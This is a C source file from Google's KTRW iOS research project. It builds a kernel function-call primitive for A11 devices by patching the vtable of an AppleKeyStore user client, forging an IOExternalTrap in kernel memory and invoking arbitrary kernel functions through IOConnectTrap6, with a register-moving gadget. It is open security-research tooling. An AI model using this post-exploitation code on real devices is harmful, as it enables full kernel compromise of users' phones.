//
// Project: KTRW
// Author:  Brandon Azad <bazad@google.com>
//
// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//

#include "kernel_call_7_a11.h"

#include <assert.h>

#include "IOKitLib.h"
#include "kernel_call.h"
#include "kernel_call_parameters.h"
#include "kernel_memory.h"
#include "kernel_tasks.h"
#include "log.h"

// ---- Global variables --------------------------------------------------------------------------

// The connection to the user client.
static io_connect_t connection;

// The address of the user client.
static uint64_t user_client;

// The size of our kernel buffer.
static const size_t kernel_buffer_size = 0x4000;

// The address of our kernel buffer.
static uint64_t kernel_buffer;

// The address of the fake IOExternalTrap.
static uint64_t fake_trap;

// The maximum size of the vtable.
static const size_t max_vtable_size = 0x1000;

// The user client's original vtable pointer.
static uint64_t original_vtable;

// ---- Initialization functions ------------------------------------------------------------------

/*
 * create_user_client
 *
 * Description:
 * 	Create a connection to an IOUserClient object. This initializes connection.
 */
static bool
create_user_client() {
	bool success = false;
	const char *service_name = "AppleKeyStore";
	// First get an iterator over matching services.
	io_iterator_t iter;
	kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
			IOServiceMatching(service_name), &iter);
	if (iter == MACH_PORT_NULL) {
		ERROR("Could not find services matching %s", service_name);
		goto fail_0;
	}
	// Try to open each service in turn.
	for (;;) {
		// Get the service.
		mach_port_t service = IOIteratorNext(iter);
		if (service == MACH_PORT_NULL) {
			ERROR("Could not open any %s", service_name);
			goto fail_1;
		}
		// Now open a connection to it.
		kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
		IOObjectRelease(service);
		if (kr == KERN_SUCCESS) {
			break;
		}
		DEBUG_TRACE(2, "%s returned 0x%x: %s", "IOServiceOpen", kr, mach_error_string(kr));
		DEBUG_TRACE(2, "Could not open %s user client", service_name);
	}
	success = true;
fail_1:
	IOObjectRelease(iter);
fail_0:
	return success;
}

/*
 * get_user_client_address
 *
 * Description:
 * 	Get the address of the IOUserClient. This initializes user_client.
 */
static void
get_user_client_address() {
	assert(MACH_PORT_VALID(connection));
	// Get the address of the port representing the IOAudio2DeviceUserClient.
	uint64_t user_client_port;
	bool ok = kernel_ipc_port_lookup(current_task, connection, &user_client_port, NULL);
	assert(ok);
	// Get the address of the IOAudio2DeviceUserClient.
	user_client = kernel_read64(user_client_port + OFFSET(ipc_port, ip_kobject));
}

/*
 * allocate_kernel_buffer
 *
 * Description:
 * 	Allocate a buffer in kernel memory. This initializes kernel_buffer and fake_trap.
 */
static bool
allocate_kernel_buffer() {
	kernel_buffer = kernel_vm_allocate(kernel_buffer_size);
	if (kernel_buffer == 0) {
		ERROR("Could not allocate kernel buffer");
		return false;
	}
	DEBUG_TRACE(1, "Allocated kernel buffer at 0x%016llx", kernel_buffer);
	fake_trap = kernel_buffer + kernel_buffer_size - SIZE(IOExternalTrap);
	return true;
}

/*
 * kernel_read_vtable_method
 *
 * Description:
 * 	Read the virtual method pointer at the specified index in the vtable.
 */
static uint64_t
kernel_read_vtable_method(uint64_t vtable, size_t index) {
	uint64_t vmethod_address = vtable + index * sizeof(uint64_t);
	return kernel_read64(vmethod_address);
}

/*
 * copyout_user_client_vtable
 *
 * Description:
 * 	Copy out the user client's vtable to userspace. The returned array must be freed when no
 * 	longer needed. This initializes original_vtable.
 */
static uint64_t *
copyout_user_client_vtable() {
	// Get the address of the vtable.
	original_vtable = kernel_read64(user_client);
	// Read the contents of the vtable to local buffer.
	uint64_t *vtable_contents = malloc(max_vtable_size);
	assert(vtable_contents != NULL);
	kernel_read(original_vtable, vtable_contents, max_vtable_size);
	return vtable_contents;
}

/*
 * patch_user_client_vtable
 *
 * Description:
 * 	Patch the contents of the user client's vtable, returning the size of the vtable.
 */
static size_t
patch_user_client_vtable(uint64_t *vtable) {
	// Replace the original vtable's IOUserClient::getTargetAndTrapForIndex() method with the
	// IOUserClient version (which calls IOUserClient::getExternalTrapForIndex()).
	uint64_t IOUserClient__getTargetAndTrapForIndex = kernel_read_vtable_method(
			ADDRESS(IOUserClient__vtable),
			VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex));
	vtable[VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex)]
		= IOUserClient__getTargetAndTrapForIndex;
	// Replace the original vtable's IOUserClient::getExternalTrapForIndex() method with
	// IORegistryEntry::getRegistryEntryID().
	vtable[VTABLE_INDEX(IOUserClient, getExternalTrapForIndex)] =
		ADDRESS(IORegistryEntry__getRegistryEntryID);
	// Count the number of methods.
	size_t count = 0;
	for (; count < max_vtable_size / sizeof(*vtable); count++) {
		if (vtable[count] == 0) {
			break;
		}
	}
	return count * sizeof(*vtable);
}

/*
 * patch_user_client
 *
 * Description:
 * 	Patch the user client in kernel memory.
 */
static void
patch_user_client(uint64_t *vtable, size_t size) {
	// Write the vtable to the kernel buffer.
	uint64_t vtable_pointer = kernel_buffer;
	kernel_write(vtable_pointer, vtable, size);
	// Overwrite the user client's registry entry ID to point to the IOExternalTrap.
	uint64_t reserved_field = user_client + OFFSET(IORegistryEntry, reserved);
	uint64_t reserved = kernel_read64(reserved_field);
	uint64_t id_field = reserved + OFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID);
	kernel_write64(id_field, fake_trap);
	// Overwrite the user client's vtable pointer with the forged pointer to our fake vtable.
	kernel_write64(user_client, vtable_pointer);
}

/*
 * unpatch_user_client
 *
 * Description:
 * 	Undo the patches to the user client.
 */
static void
unpatch_user_client() {
	// Write the original vtable pointer back to the user client.
	kernel_write64(user_client, original_vtable);
}

// ---- Function calling primitive ----------------------------------------------------------------

static uint32_t
kernel_call_7v_internal(uint64_t function, size_t argument_count, const uint64_t arguments[]) {
	assert(function != 0);
	assert(argument_count <= 7);
	assert(argument_count == 0 || arguments[0] != 0);
	assert(MACH_PORT_VALID(connection) && fake_trap != 0);
	// Get exactly 7 arguments. Initialize args[0] to 1 in case there are no arguments.
	uint64_t args[7] = { 1 };
	for (size_t i = 0; i < argument_count && i < 7; i++) {
		args[i] = arguments[i];
	}
	// Initialize the IOExternalTrap for this call.
	uint8_t trap_data[SIZE(IOExternalTrap)];
	FIELD(trap_data, IOExternalTrap, object,   uint64_t) = args[0];
	FIELD(trap_data, IOExternalTrap, function, uint64_t) = function;
	FIELD(trap_data, IOExternalTrap, offset,   uint64_t) = 0;
	kernel_write(fake_trap, trap_data, SIZE(IOExternalTrap));
	// Perform the function call.
	uint32_t result = IOConnectTrap6(connection, 0,
			args[1], args[2], args[3], args[4], args[5], args[6]);
	return result;
}

// ---- API ---------------------------------------------------------------------------------------

bool
kernel_call_7_a11_init() {
	// Initialize the parameters. We do this first to fail early.
	bool ok = kernel_call_parameters_init();
	if (!ok) {
		return false;
	}
	// We need to have a current_task in order to initialize.
	if (current_task == 0) {
		ok = kernel_tasks_init();
		if (!ok) {
			ERROR("Need current_task to initialize kernel_call_7 on A11");
			return false;
		}
	}
	// Create the IOUserClient.
	ok = create_user_client();
	if (!ok) {
		ERROR("Could not create %s user client", "AppleKeyStore");
		return false;
	}
	// Get the address of the user client.
	get_user_client_address();
	// Allocate the kernel buffer.
	ok = allocate_kernel_buffer();
	if (!ok) {
		return false;
	}
	// Copy out the user client's vtable in preparation for patching.
	uint64_t *vtable = copyout_user_client_vtable();
	// Patch the vtable for kernel function calling.
	size_t vtable_size = patch_user_client_vtable(vtable);
	// Patch the user client with the new vtable.
	patch_user_client(vtable, vtable_size);
	// Discard the allocated vtable.
	free(vtable);
	// Success!
	return true;
}

void
kernel_call_7_a11_deinit() {
	if (original_vtable != 0) {
		// Restore the user client.
		unpatch_user_client();
		original_vtable = 0;
	}
	if (kernel_buffer != 0) {
		// Deallocate our kernel buffer.
		kernel_vm_deallocate(kernel_buffer, kernel_buffer_size);
		kernel_buffer = 0;
		fake_trap = 0;
	}
	if (MACH_PORT_VALID(connection)) {
		// Close the connection.
		IOServiceClose(connection);
		connection = MACH_PORT_NULL;
	}
}

uint32_t
kernel_call_7v(uint64_t function, size_t argument_count, const uint64_t arguments[]) {
	// If we really need the first argument to be 0, and we have at most 4 arguments, and we
	// have the "mov x0, x4 ; br x5" gadget, then transform our call to use the gadget.
	uint64_t adjusted_arguments[7] = {};
	if (argument_count >= 1 && arguments[0] == 0 && argument_count <= 4
			&& ADDRESS(mov_x0_x4__br_x5) != 0) {
		adjusted_arguments[0] = 1;
		for (size_t i = 1; i < argument_count; i++) {
			adjusted_arguments[i] = arguments[i];
		}
		adjusted_arguments[4] = arguments[0];
		adjusted_arguments[5] = function;
		function = ADDRESS(mov_x0_x4__br_x5);
		arguments = adjusted_arguments;
		argument_count = 6;
	}
	return kernel_call_7v_internal(function, argument_count, arguments);
}
